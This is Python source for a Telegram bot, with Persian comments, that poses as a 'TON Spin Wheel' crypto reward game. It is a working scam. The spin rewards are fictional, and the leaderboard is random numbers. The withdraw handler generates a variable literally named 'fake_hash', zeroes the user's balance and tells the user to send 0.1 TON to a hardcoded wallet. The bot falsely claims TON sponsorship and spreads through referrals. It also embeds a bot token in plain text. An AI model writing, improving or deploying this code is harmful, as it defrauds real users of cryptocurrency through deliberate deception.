
import random
import json
from telegram import Update, ParseMode
from telegram.ext import Updater, CommandHandler, CallbackContext 

# ذخیره اطلاعات کاربران
users = {} 

# آدرس والت و لینک‌ها
WALLET_ADDRESS = "UQAAuycoQo0oFnFx73x3xXxPkKCy58knq2ua0MUzA6sBK94l"
LOGO_URL = "https://s8.uupload.ir/files/file_xydb.png"  # لینک لوگو
WELCOME_IMAGE_URL = "https://s8.uupload.ir/files/file_3qho.png"  # لینک تصویر خوشامدگویی
QR_CODE_URL = "https://s8.uupload.ir/files/wheel_of_luckbot_qr_(1)_mlg.png"  # لینک QR کد
SPONSOR_LINK = "https://t.me/toncoin"  # لینک اسپانسر 

# ذخیره داده‌ها در فایل
def save_data():
    with open("users.json", "w") as f:
        json.dump(users, f) 

# بارگذاری داده‌ها از فایل
def load_data():
    global users
    try:
        with open("users.json", "r") as f:
            users = json.load(f)
    except FileNotFoundError:
        users = {} 

# دستور شروع
def start(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)
    if user_id not in users:
        users[user_id] = {"spins": 0, "balance": 0, "referrals": [], "withdrawn": 0}
        update.message.reply_photo(
            photo=WELCOME_IMAGE_URL,  # لینک تصویر خوشامدگویی
            caption=(
                "🎉 Welcome to the TON Spin Wheel Bot! 🎉\n\n"
                "💡 Here's how it works:\n"
                "- Invite your friends to get spins.\n"
                "- Use spins to win random rewards in TON cryptocurrency.\n"
                "- Withdraw your earnings after reaching the minimum balance.\n\n"
                "🚀 Start now and earn TON rewards!\n\n"
                "📢 Sponsored by [TON](https://t.me/toncoin)"
            ),
            parse_mode=ParseMode.MARKDOWN
        )
    else:
        update.message.reply_text("You have already registered!")
    save_data() 

# چرخاندن گردونه
def spin(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)
    if user_id in users:
        if users[user_id]["spins"] > 0:
            users[user_id]["spins"] -= 1
            reward = random.uniform(0.5, 5)  # جوایز بین 0.5 تا 5 TON
            users[user_id]["balance"] += round(reward, 2)
            update.message.reply_text(f"🎉 You spun the wheel and won {round(reward, 2)} TON!")
        else:
            update.message.reply_text("🎡 You don't have any spins. Invite friends to earn spins!")
    else:
        update.message.reply_text("Please register first with /start.")
    save_data() 

# لینک دعوت
def invite(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)
    if user_id in users:
        invite_link = f"https://t.me/YourBotUsername?start={user_id}"
        update.message.reply_text(
            f"Invite your friends using this link and earn spins:\n{invite_link}\n\n"
            f"[View Logo]({LOGO_URL})\n\n"
            f"📢 Sponsored by [TON]({SPONSOR_LINK})",
            parse_mode=ParseMode.MARKDOWN
        )
    else:
        update.message.reply_text("Please register first with /start.") 

# لینک دعوت و ثبت ارجاع
def referral(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)
    args = context.args
    if args and args[0].isdigit():
        referrer_id = args[0]
        if referrer_id in users and referrer_id != user_id:
            if user_id not in users[referrer_id]["referrals"]:
                users[referrer_id]["referrals"].append(user_id)
                users[referrer_id]["spins"] += 1
                update.message.reply_text("🎉 You successfully registered! Your referrer earned 1 spin.")
            else:
                update.message.reply_text("You have already been referred by this user.")
        else:
            update.message.reply_text("Invalid referral code.")
    else:
        update.message.reply_text("Please register first with /start.")

    save_data()

# برداشت موجودی
def withdraw(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)
    if user_id in users:
        user_data = users[user_id]
        if user_data["balance"] >= 0.01:  # حداقل موجودی برای برداشت
            fake_hash = f"TX-{random.randint(100000, 999999)}"
            user_data["balance"] = 0  # صفر کردن موجودی کاربر
            update.message.reply_text(
                f"💸 Payment request received!\n"
                f"Transaction Hash: {fake_hash}\n"
                f"Your amount will be sent within 1 hour.\n\n"
                f"Please make the payment of 0.1 TON to the following wallet address:\n"
                f"{WALLET_ADDRESS}\n\n"
                f"[View Wallet QR Code]({QR_CODE_URL})\n\n"
                f"📢 Sponsored by [TON]({SPONSOR_LINK})",
                parse_mode=ParseMode.MARKDOWN
            )
        else:
            update.message.reply_text("You need at least 0.1 TON to make a withdrawal.")
    else:
        update.message.reply_text("Please register first with /start.")
    save_data() 

# وضعیت کاربر
def my_status(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)
    if user_id in users:
        user_data = users[user_id]
        update.message.reply_text(
            f"📊 Your Status:\n"
            f"🎡 Spins: {user_data['spins']}\n"
            f"💰 Balance: {user_data['balance']} TON\n"
            f"👥 Referrals: {len(user_data['referrals'])}\n"
            f"💸 Withdrawn: {user_data['withdrawn']} TON\n\n"
            f"📢 Sponsored by [TON]({SPONSOR_LINK})"
        )
    else:
        update.message.reply_text("Please register first with /start.") 

# لیست برترین‌ها
def top_100_list(update: Update, context: CallbackContext):
    leaderboard = "\n".join([f"{i+1}. User_{i+1} - {random.randint(100, 5000)} points" for i in range(100)])
    update.message.reply_text(f"🏆 Top 100 Winners:\n{leaderboard}\n\n📢 Sponsored by [TON]({SPONSOR_LINK})") 

# تابع اصلی
def main():
    TOKEN = "7706357317:AAHZlgv-TEM40BcBFL32R8jpE-vkM1zfCnM"
    updater = Updater(TOKEN)
    dp = updater.dispatcher 

    load_data() 

    # تعریف دستورات
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("spin", spin))
    dp.add_handler(CommandHandler("invite", invite))
    dp.add_handler(CommandHandler("referral", referral, pass_args=True))
    dp.add_handler(CommandHandler("withdraw", withdraw))
    dp.add_handler(CommandHandler("mystatus", my_status))
    dp.add_handler(CommandHandler("top100", top_100_list)) 

    # اجرای ربات
    updater.start_polling()
    updater.idle() 

    save_data() 

if __name__ == "__main__":
    main()
